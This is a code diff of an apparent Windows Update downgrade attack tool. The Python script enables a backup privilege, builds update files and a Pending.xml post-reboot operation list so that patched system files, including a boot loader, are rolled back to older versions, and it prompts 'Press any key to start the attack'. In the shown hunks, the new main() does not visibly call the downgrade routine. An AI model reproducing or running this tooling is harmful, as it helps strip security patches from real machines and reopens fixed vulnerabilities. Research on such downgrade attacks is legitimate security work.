@@ -1,8 +1,9 @@
 import os
 
-from component_store import create_base_update_files
-from filesystem_utils import create_dir, is_file_contents_equal, is_path_exists, Path
-from xml_utils import load_xml, find_child_elements_by_match, create_element, append_child_element
+from utils.component_store import create_base_update_files
+from utils.filesystem import create_dir, is_file_contents_equal, is_path_exists, Path
+from utils.xml import load_xml, find_child_elements_by_match, create_element, append_child_element
+from utils.privilege import enable_backup_privilege
 
 """
 Potential issues:
@@ -12,10 +13,9 @@ Also make sure that the downgraded boot loader is not revoked
 """
 
 
-def main():
-    input("Press any key to start the attack")
-
+def downgrade_to_base():
     base_dir_path = Path("C:\\Users\\Alon\\Desktop\\BYOVW\\Update")
+    # base_dir_path = Path("C:\\Users\\User\\Desktop\\Repos\\BYOVW\\Update")
 
     print("[INFO] Creating update directory")
     create_dir(base_dir_path.full_path, exist_ok=True)
@@ -24,7 +24,7 @@ def main():
     update_files = create_base_update_files(base_dir_path.full_path)
 
     print("[INFO] Loading downgrade xml")
-    downgrade_root = load_xml("BYOVW\\resources\\Pending.xml")
+    downgrade_root = load_xml("resources\\Pending.xml")
     poq_elements = find_child_elements_by_match(downgrade_root, "./POQ")
     poq_post_reboot_element = poq_elements[0]
 
@@ -58,6 +58,11 @@ def main():
     print("[INFO] Restart your computer to be down to date!")
 
     print(f"[WARNING] Skipped paths: {skipped_paths}")
+
+
+def main():
+    enable_backup_privilege()
+    input("Press any key to start the attack")
 
 
 if __name__ == '__main__':
